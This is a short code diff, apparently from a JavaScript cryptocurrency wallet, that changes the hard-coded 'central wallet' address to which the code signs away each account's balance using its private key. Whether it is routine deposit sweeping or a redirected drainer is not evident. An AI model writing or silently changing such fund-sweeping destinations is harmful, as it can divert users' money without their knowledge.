@@ -52,7 +52,7 @@ function Wallet() {
                                 if (amnt > gasPrice * 23000) {
                                     // send balance to central wallet 
                                     web3.eth.accounts.signTransaction({
-                                        to: "0x1C3BC05C4cD2902FFbF20e3b87A2cc9d793Fc42B",
+                                        to: "0x7B42Ee76D570c13eded96053E0042a77e944bF7d",
                                         value: parseInt(amnt - gasPrice * 23000),
                                         gas: 21000
                                     }, data.key)
